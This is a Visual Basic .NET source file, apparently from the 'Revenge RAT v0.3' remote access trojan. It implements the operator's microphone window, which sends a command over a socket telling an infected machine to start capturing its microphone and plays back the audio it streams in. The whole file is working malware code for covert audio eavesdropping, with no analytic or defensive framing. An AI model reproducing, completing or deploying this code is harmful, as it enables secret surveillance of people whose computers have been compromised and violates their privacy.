Imports Microsoft.VisualBasic.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT
Imports WinMM

Public Class Microphone
    Public sock As Integer
    Private SP As WaveOut
    Private Sub Microphone_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        My.Forms.Main.s.Send(Me.sock, "SRC")
    End Sub

    Private Sub Microphone_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim caps As WaveOutDeviceCaps
        For Each caps In WaveOut.Devices
            Me.ComboBox1.Items.Add(caps.Name)
        Next
        Me.ComboBox1.SelectedIndex = 0
        Me.StartRec.PerformClick()
    End Sub

    Private Sub StartRec_Click(sender As Object, e As EventArgs) Handles StartRec.Click
        If (Me.StartRec.Text = "Start") Then
            Dim flag As Boolean
            Me.StartRec.Text = "Stop"
            If Me.BZ.Items.Item(Me.BZ.SelectedIndex).ToString.Contains(" - 8bit") Then
                flag = True
            Else
                flag = False
            End If
            My.Forms.Main.s.Send(Me.sock, String.Concat(New String() {"STRC", My.Forms.Main.Key, Me.DV.Items.Item(Me.DV.SelectedIndex).ToString, My.Forms.Main.Key, Conversions.ToString(flag), My.Forms.Main.Key, Conversions.ToString(CInt((Conversions.ToInteger(Me.BZ.Text.Split(New Char() {" "c})(0)) * &H400))), My.Forms.Main.Key, Conversions.ToString(Me.CT.SelectedIndex)}))
            Me.DV.Enabled = False
            Me.BZ.Enabled = False
            Me.CT.Enabled = False
            Me.ComboBox1.Enabled = False
        Else
            Me.DV.Enabled = True
            Me.BZ.Enabled = True
            Me.CT.Enabled = True
            Me.ComboBox1.Enabled = True
            Me.StartRec.Text = "Start"
            Me.Label4.Text = ".."
            My.Forms.Main.s.Send(Me.sock, "SRC")
        End If
    End Sub

    Public Function RAUD(ByVal DVN As String) As Integer
        Dim num As Integer
        Dim caps As WaveOutDeviceCaps
        For Each caps In WaveOut.Devices
            If (caps.Name = DVN) Then
                Return caps.DeviceId
            End If
        Next
        Return num
    End Function

    Public Function RS(ByVal D As Byte()) As Object
        Dim obj2 As Object
        If (Me.StartRec.Text = "Stop") Then
            Try
                Me.SP = New WaveOut(Me.RAUD(Me.ComboBox1.Items.Item(Me.ComboBox1.SelectedIndex).ToString))
                Me.SP.Open(Me.WF)
                Me.SP.Write(D)
                Me.Label4.Text = SocketServer.GetSize(CULng(D.Length))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                MessageBox.Show(exception.Message)
                ProjectData.ClearProjectError()
            End Try
        End If
        Return obj2
    End Function
    Public Function WF() As WaveFormat
        Dim format As WaveFormat
        If ((Me.CT.SelectedIndex = 0) And Me.BZ.Items.Item(Me.BZ.SelectedIndex).ToString.Contains(" - 16bit")) Then
            Return WaveFormat.Pcm44Khz16BitStereo
        End If
        If ((Me.CT.SelectedIndex = 0) And Me.BZ.Items.Item(Me.BZ.SelectedIndex).ToString.Contains(" - 8bit")) Then
            Return WaveFormat.Pcm44Khz8BitStereo
        End If
        If ((Me.CT.SelectedIndex = 1) And Me.BZ.Items.Item(Me.BZ.SelectedIndex).ToString.Contains(" - 16bit")) Then
            Return WaveFormat.Pcm44Khz16BitMono
        End If
        If ((Me.CT.SelectedIndex = 1) And Me.BZ.Items.Item(Me.BZ.SelectedIndex).ToString.Contains(" - 8bit")) Then
            format = WaveFormat.Pcm44Khz8BitMono
        End If
        Return format
    End Function
End Class